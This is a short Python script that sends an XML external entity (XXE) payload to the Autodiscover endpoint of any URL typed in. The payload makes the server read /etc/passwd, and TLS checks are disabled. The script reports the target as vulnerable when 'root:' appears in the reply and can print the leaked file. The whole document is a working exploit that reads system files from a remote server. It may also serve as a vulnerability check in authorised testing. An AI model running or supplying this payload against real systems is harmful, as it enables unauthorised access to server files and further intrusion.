import requests
from rich import print
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def make_request():
    payload = """
 <!DOCTYPE xxe [  <!ELEMENT  name ANY >  <!ENTITY  xxe SYSTEM "file:///etc/passwd">]>  <Autodiscover  xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">  <Request>  <EMailAddress>aaaaa</EMailAddress>  <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>  </Request>  </Autodiscover>
    """
    print("[yellow]:: Checking...[/] ", end="")
    r = requests.post(url, verify=False,data=payload)
    if "root:" in r.text:
        print("[red][VULNERABLE][/]")
        q = input(":: Want to see the response? [y/N] ")
        if q == "y":
            print(r.text)
        else:
            return
    else:
        print("[green][OK][/]")

url = input("\nurl> ")
if "Autodiscover.xml" not in url:
    url += "/Autodiscover/Autodiscover.xml"
make_request()
